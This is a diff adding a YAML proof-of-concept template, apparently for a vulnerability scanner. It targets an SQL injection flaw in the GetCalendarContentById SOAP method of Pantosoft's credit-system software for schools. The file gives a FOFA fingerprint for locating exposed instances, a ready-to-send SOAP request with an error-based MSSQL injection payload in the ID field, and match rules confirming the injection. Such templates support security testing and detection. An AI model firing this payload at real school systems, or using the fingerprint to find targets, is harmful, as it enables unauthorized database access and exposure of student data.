@@ -1,0 +1,23 @@
+id: poc-yaml-credit-system-getcalendarcontentbyid-sqli
+info:
+  name: 学分制系统 GetCalendarContentById SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 学分制系统
+  fofa: body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WebService_PantoSchool.asmx
+  headers:
+    Content-Type: text/xml;charset=utf-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:tem=\"http://tempuri.org/\">\n<soapenv:Header/>\n<soapenv:Body>\n<tem:GetCalendarContentById>\n\
+    \  <!--type: string-->\n  <tem:ID>1' OR 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))\
+    \ AND '1'='1</tem:ID>\n</tem:GetCalendarContentById>\n</soapenv:Body>\n</soapenv:Envelope>"
+  expression: "status_code == 500 && \ncontains(body,\"转换成数据类型 int 时失败\") &&\ncontains(body,t2)\
+    \ &&\ncontains(content_type,\"text/xml\")\n"
+transport: http
